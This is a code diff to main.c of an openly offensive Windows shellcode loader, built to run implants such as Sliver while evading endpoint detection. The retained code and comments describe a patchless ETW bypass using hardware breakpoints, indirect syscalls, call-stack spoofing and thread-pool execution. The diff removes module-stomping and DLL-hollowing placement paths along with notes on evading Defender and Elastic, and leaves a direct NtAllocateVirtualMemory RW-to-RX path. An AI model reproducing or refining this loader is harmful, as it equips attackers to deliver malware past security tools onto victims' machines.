@@ -2,7 +2,7 @@
 // main.c - Shellcode Loader
 //
 // Evasion:  Patchless ETW (VEH + HW breakpoints)
-// Memory:   Phantom DLL Hollowing -> Module Stomp -> NtAllocateVirtualMemory
+// Memory:   NtAllocateVirtualMemory
 // Thread:   Thread pool callback (TpAllocWork/TpPostWork)
 // Stack:    Call gadget injection + tail-call spoofing
 // Syscalls: Indirect with randomized gadget pool
@@ -64,13 +64,12 @@ int Main(VOID) {
     // --- Shuffled DLL preload ---
     // Load the three flow-critical DLLs in per-run randomized order so
     // kernel ETW image-load sequence can't be learned by ML baselining.
-    // Subsequent LoadLibraryA calls in Evasion/Staging/Stomper hit the
+    // Subsequent LoadLibraryA calls in Evasion/Staging hit the
     // loader cache and emit no further image-load events.
     BYTE xAmsi[]    = XSTR_AMSI_DLL;    DEOBF(xAmsi);
     BYTE xWininet[] = XSTR_WININET_DLL; DEOBF(xWininet);
-    BYTE xKtm[]     = XSTR_KTMW32_DLL;  DEOBF(xKtm);
-    LPCSTR preload[] = { (LPCSTR)xAmsi, (LPCSTR)xWininet, (LPCSTR)xKtm };
-    ShufflePreloadLibraries(&WinApis, preload, 3);
+    LPCSTR preload[] = { (LPCSTR)xAmsi, (LPCSTR)xWininet };
+    ShufflePreloadLibraries(&WinApis, preload, 2);
 
     // --- Patchless ETW bypass ---
     // VEH + hardware breakpoint on EtwEventWrite (DR0)
@@ -163,22 +162,9 @@ int Main(VOID) {
     }
 
     // ============================================================
-    // Stage 1: Shellcode Placement (3-tier fallback)
+    // Stage 1: Shellcode Placement (NtAllocateVirtualMemory)
     //
-    // 1. Phantom DLL Hollowing (NTFS Transactions)
-    //    - Section backed by rolled-back transacted file
-    //    - EDR can't verify memory against disk (FILE_OBJECT mismatch)
-    //    - Requires write access to System32 DLL (elevated)
-    //
-    // 2. Module Stomping
-    //    - LoadLibrary + overwrite .text section
-    //    - Memory attributed to signed DLL
-    //    - Detectable by EDR integrity checks (disk vs memory)
-    //
-    // 3. NtAllocateVirtualMemory (last resort)
-    //    - Private memory (most suspicious)
-    //    - Always works regardless of shellcode size
-    //
+    // Private RW allocation → shellcode copy → flip to RX/RWX.
     // Memory protection is controlled by SHELLCODE_EXEC_PROT:
     //   RWX_SHELLCODE defined:   PAGE_EXECUTE_READWRITE (Go/Sliver)
     //   RWX_SHELLCODE undefined: PAGE_EXECUTE_READ (W^X)
@@ -186,44 +172,6 @@ int Main(VOID) {
 
     PVOID pExec   = NULL;
     BOOL  bPlaced = FALSE;
-
-    // 4-tier placement fallback (P1-A). Order is "least Defender-attention
-    // first":
-    //
-    //   1. ModuleStomp     — pure in-memory write to a signed DLL's .text;
-    //                        no NTFS transaction, no FILE_OBJECT trickery.
-    //                        Defender MpFilter has no hook here.
-    //   2. GhostlyHollow   — FILE_FLAG_DELETE_ON_CLOSE + SEC_IMAGE. Avoids
-    //                        the transaction path that previously fired
-    //                        `transactionfile:...` alerts. Shellcode is
-    //                        written XOR-encrypted; decrypted in-memory.
-    //   3. PhantomDllHollow — NTFS-transaction-backed image section. Still
-    //                        the strongest disk-vs-memory mismatch, but
-    //                        Defender's MpFilter is transaction-aware
-    //                        since 2022, so we wrote the shellcode XOR'd
-    //                        (P2-E) — Defender sees garbage in the
-    //                        in-flight transaction view.
-    //   4. NtAllocate      — private RW->RX allocation. Loudest path
-    //                        (Elastic correlates against unbacked memory).
-    //                        Last resort.
-    //bPlaced = ModuleStomp(&WinApis, pShellcode, dwShellcodeSize, &pExec);
-    //if (bPlaced) {
-    //    LOG("[+] Shellcode placed via module stomping");
-    //}
-
-    //if (!bPlaced) {
-    //    bPlaced = GhostlyHollow(&WinApis, &NtApis, pShellcode, dwShellcodeSize, &pExec);
-    //    if (bPlaced) {
-    //        LOG("[+] Shellcode placed via ghostly hollowing");
-    //    }
-    //}
-
-    //if (!bPlaced) {
-    //    bPlaced = PhantomDllHollow(&WinApis, &NtApis, pShellcode, dwShellcodeSize, &pExec);
-    //    if (bPlaced) {
-    //        LOG("[+] Shellcode placed via phantom DLL hollowing");
-    //    }
-    //}
 
     // NtAllocate: direct allocation (RW -> copy -> RX/RWX)
     if (!bPlaced) {
@@ -334,17 +282,7 @@ int Main(VOID) {
     // Store target + gadget for the ASM callback wrapper
     SetSpoofTarget(pExec, pCallGadget);
 
-    // #9 Draugr MVP (opt-in, disabled by default — see Common.h).
-    // Builds a 1 MB synthetic stack whose top contains three fake
-    // return addresses pointing into RtlUserThreadStart /
-    // BaseThreadInitThunk / NtWaitForSingleObject. SpoofCallback swaps
-    // RSP to this buffer before jumping to shellcode so kernel call-
-    // stack walkers see a plausible fresh-thread chain.
-#ifdef ENABLE_SYNTHETIC_STACK
-    SetSpoofStack(BuildSyntheticStack(&WinApis));
-#else
     SetSpoofStack(NULL);
-#endif
 
     // pNtdll needed below for thread-pool fallback path
     BYTE xNtdll[] = XSTR_NTDLL_DLL;
